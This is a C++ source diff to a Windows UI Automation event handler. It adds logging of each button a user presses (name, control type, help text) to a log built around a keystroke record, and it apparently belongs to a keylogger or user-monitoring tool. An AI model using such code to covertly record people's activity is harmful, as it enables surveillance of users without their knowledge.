@@ -94,6 +94,7 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 
 	BSTR bWindowName = NULL;
 	BSTR bClassName = NULL;
+	BSTR bLocalizedControlType = NULL;
 
 	DWORD size = 0;
 	HRESULT hr = ERROR_SUCCESS;
@@ -106,6 +107,9 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 	CComPtr<IUIAutomationElement> pAutomationElementChild = pAutomationElement;
 	CComPtr<IUIAutomationElement> pAutomationElementParent = NULL;
 
+	CONTROLTYPEID ctId;
+
+	std::wstring wsControlType = L"";
 	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [" + wsEventString + L"]";
 
 	switch (eventID)
@@ -148,6 +152,55 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 		Log(wsLogKeyStroke, EMPTY);
 		break;
 
+	case UIA_Invoke_InvokedEventId:
+		
+		hr = pAutomationElement->get_CurrentName(&bWindowName);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get window name", DBG);
+			break;
+		}
+		
+		hr = pAutomationElement->get_CurrentClassName(&bClassName);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get current class name", DBG);
+			break;
+		}
+
+		hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleHelpPropertyId, &vHelp);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get help property value", DBG);
+			break;
+		}
+
+		hr = pAutomationElement->get_CurrentControlType(&ctId);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get current control type", DBG);
+			break;
+		}
+
+		wsControlType = Helpers::ControlTypeIdToString(ctId);
+
+		hr = pAutomationElement->get_CurrentLocalizedControlType(&bLocalizedControlType);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get localized control type", DBG);
+			break;
+		}
+
+		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";
+		wsLogKeyStroke += L"\n\tControlType: " + std::wstring(wsControlType);
+		wsLogKeyStroke += L"\n\tLocalizedControlType: " + std::wstring(bLocalizedControlType);
+		wsLogKeyStroke += L"\n\tName: " + std::wstring(bWindowName);
+		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
+		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";
+
+		Log(wsLogKeyStroke, EMPTY);
+		break;
+
 	case UIA_Window_WindowOpenedEventId:
 		hr = g_pMyTreeWalker->GetFirstAscendingWindowName(pAutomationElement, &bWindowName);
 		if (FAILED(hr))
@@ -175,6 +228,9 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 		Log(L"Arrived unknown event in HandleOther(). How to process that? :)" + wsEventString, DBG);
 		break;
 	}
+
+	if (bLocalizedControlType)
+		SysFreeString(bLocalizedControlType);
 
 	if (bWindowName)
 		SysFreeString(bWindowName);
